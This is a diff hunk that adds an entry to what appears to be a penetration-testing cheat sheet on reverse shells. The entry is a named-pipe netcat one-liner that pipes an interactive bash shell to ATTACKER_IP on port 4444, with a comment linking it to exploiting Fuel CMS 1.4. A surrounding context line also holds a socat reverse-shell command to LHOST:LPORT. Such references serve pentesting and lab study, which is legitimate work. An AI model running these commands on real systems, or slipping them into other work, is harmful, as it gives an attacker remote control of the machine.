@@ -4444,6 +4444,14 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
 
 # Chapter 5: Reverse Shells — Every Language & Case
 
+## With named pipe (works perfectly):
+## useful when the reverse shell is required after exploit db payload stabilisation on sppecially fuel cms 1.4<
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+
+```
+
 ## 5.1 How a Reverse Shell Works (Theory)
 
 ```
